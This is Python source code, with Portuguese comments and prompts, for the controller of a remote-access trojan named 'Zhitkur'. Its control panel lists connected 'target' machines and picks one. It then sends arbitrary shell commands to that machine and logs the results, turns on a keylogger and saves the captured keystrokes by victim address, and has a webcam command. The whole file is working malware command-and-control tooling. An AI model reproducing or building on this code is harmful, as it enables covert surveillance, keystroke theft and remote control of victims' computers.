import socket, threading, sys, sqlite3, os
from datetime import datetime

# ========= FUNCOES DE HELP =========
def ajuda_painelcontrole():
    print("""\nComandos disponiveis:
    Ajuda -> Mostra todos os comandos disponiveis
    Acessar -> Escolhe um dos aparelhos online para acessar
    Aparelhos online -> Mostra todos aparelhos online
    Fechar conexoes -> Fecha todas as conexoes disponiveis
    Fechar servidor -> Desliga o servidor
    Sair -> Fecha as conexoes, desliga o servidor e para o programa""")

def ajuda_alvo():
    print("""\nComandos disponiveis:
    Detalhes da maquina -> Recebe todos os detalhes da maquina alvo
    Detalhes do python -> Recebe todos os detalhes do python instalado na maquina alvo
    Keylogger -> Ativa o keylogger na maquina alvo e interrompe o programa até o keylogger ser desativado
    Sair -> Sai do controle da maquina, mas não finaliza conexao
    Fechar conexao -> Finaliza conexao com a maquina""")

# ========= Criar databases =========
def criar_conexoes_db():
    conn = sqlite3.connect('Databases/conexoes.db')
    cursor = conn.cursor()
    cursor.execute("""
    CREATE TABLE conexoes(
        conn TEXT,
        addr TEXT,
        horario TEXT
    );
    """)
    conn.commit()
    cursor.close()
    conn.close()

# ========= FUNCOES DE ARQUIVOS  =========
def checagem_diretorios():
    if(os.path.isdir('Registros/')):
        if(os.path.isdir('Databases/')):
            if(os.path.isfile('Databases/conexoes.db')):
                pass
            else:
                criar_conexoes_db()
        else:
            os.mkdir('Databases/')
    else:
        os.mkdir('Registros/')
        if(os.path.isdir('Databases/')):
            pass
        else:
            os.mkdir('Databases/')

def salvar_arquivo(mensagem,dir):
    if(os.path.isdir('Registros/')):
        if(os.path.isdir('Registros/{}/'.format(dir))):
            if(os.path.isfile('Registros/{}/{}.txt'.format(dir,dir))):
                arquivo = open('Registros/{}/{}.txt'.format(dir,dir),'a')
                arquivo.writelines(mensagem)
                arquivo.close()
            else:
                arquivo = open('Registros/{}/{}.txt'.format(dir,dir),'w')
                arquivo.writelines(mensagem)
                arquivo.close()
        else:
            os.mkdir('Registros/{}/'.format(dir))
            arquivo = open('Registros/{}/{}.txt'.format(dir,dir),'w')
            arquivo.writelines(mensagem)
            arquivo.close()
    else:
        os.mkdir('Registros/')
        os.mkdir('Registros/{}/'.format(dir))
        arquivo = open('Registros/{}/{}.txt'.format(dir,dir),'w')
        arquivo.writelines(mensagem)
        arquivo.close()

def registro_conexoes(conn,addr):
    now = datetime.now()
    dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    db = sqlite3.connect('Databases/conexoes.db')
    cursor = db.cursor()
    cursor.execute("""
    INSERT INTO conexoes (conn, addr, horario)
    VALUES (?,?,?)""", (str(conn), str(addr), str(dt_string)))
    db.commit()
    db.close()

# ========= FUNCOES DE ENVIO E RECIBO =========
def send_recv_padrao(conn,shell_):
    conn.send(shell_.encode())
    output = conn.recv(2048)
    output_ = "\nOutput do comando: {}{}".format(shell_,output.decode())
    print("\n{}".format(output.decode()))
    return(output_)

# ========= FUNCAO DO KEYLOGGER =========
def keylogger(conn,addr,shell_):
    conn.send(shell_.encode())
    output = conn.recv(2048)
    v1 = str(output.decode())
    v2 = v1.strip('[]')
    v3 = v2.strip("''")
    v4 = 'Resultado do keylogger: {}'.format(v3)
    mensagem = "\nKeylogger concluido com sucesso, foram capturadas {}".format(len(output))
    print(mensagem)
    salvar_arquivo(v4,addr)

# ========= FUNCAO DE WEBCAM =========
def webcam(conn,addr,shell_):
    conn.send(shell_.encode())

# ========= FUNCOES DE CONTROLE =========
def painel_controle(lista_addr, lista_clientes):
    while True:
        shell = str(input("\nZhitkur >>> "))

        if(shell.upper() == "AJUDA"):
            ajuda_painelcontrole()

        elif(shell.upper() == "ACESSAR"):
            print("\nAparelhos disponiveis para acesso: ")
            indice = 0
            for addr in lista_addr:
                print("\t{}: {}".format(indice,addr))
                indice += 1
            escolha = int(input("Digite o indice do aparelho que deseja controlar: "))
            alvo(lista_clientes[escolha],lista_addr[escolha])

        elif(shell.upper() == "APARELHOS ONLINE"):
            print("\nAparelhos conectados na rede:")
            for addr in lista_addr:
                print("\t{}".format(addr))

        elif(shell.upper() == "FECHAR CONEXOES"):
            for clientes in lista_clientes:
                clientes.close()
        else:
            mensagem = "\nComando o reconhecido no sistema, tente novamente"
            print(mensagem)

def alvo(conn,addr):
    print("\nConectado com sucesso em {}".format(addr))
    while True:
        shell_ = str(input("\nZhitkur:{} >>> ".format(addr)))

        if(shell_.upper() == "SAIR"):
            print("\n{} Está em standby".format(addr))
            break

        elif(shell_.upper() == "FECHAR CONEXAO"):
            print("\nConexao encerrada com {}".format(addr))
            conn.close()
            break

        elif(shell_.upper() == "AJUDA"):
            ajuda_alvo()

        elif(shell_.upper() == "KEYLOGGER"):
            keylogger(conn,addr,shell_)

        elif(shell_.upper() == "WEBCAM"):
            webcam(conn,addr,shell_)

        else:
            output_ = send_recv_padrao(conn,shell_)
            salvar_arquivo(output_,addr)
